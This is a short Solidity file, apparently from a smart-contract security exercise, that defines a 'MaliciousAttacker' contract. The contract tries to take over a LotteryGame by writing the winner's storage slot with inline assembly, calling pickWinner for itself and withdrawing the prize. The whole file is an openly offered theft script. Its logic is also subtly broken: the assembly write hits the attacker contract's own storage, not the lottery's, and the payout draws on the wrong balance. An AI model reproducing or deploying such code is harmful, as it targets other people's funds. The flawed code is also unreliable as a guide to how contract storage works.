// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Backdoor-assembly.sol";

contract MaliciousAttacker {
    LotteryGame public lotteryGame;
    address public attacker;

    constructor(address _lotteryGame) {
        lotteryGame = LotteryGame(_lotteryGame);
        attacker = msg.sender;
    }

    function exploit() public {
        // Use assembly to directly set the winner to the attacker address
        assembly {
            // The winner's address is stored in slot 1 of the LotteryGame contract
            sstore(1, sload(attacker.slot))
        }

        // Call the pickWinner function to trigger the vulnerability and set the winner
        lotteryGame.pickWinner(attacker);

        // Withdraw the prize pool
        uint256 prize = lotteryGame.prize();
        require(prize > 0, "No prize to withdraw");
        (bool success, ) = attacker.call{value: prize}("");
        require(success, "Withdraw failed");
    }
}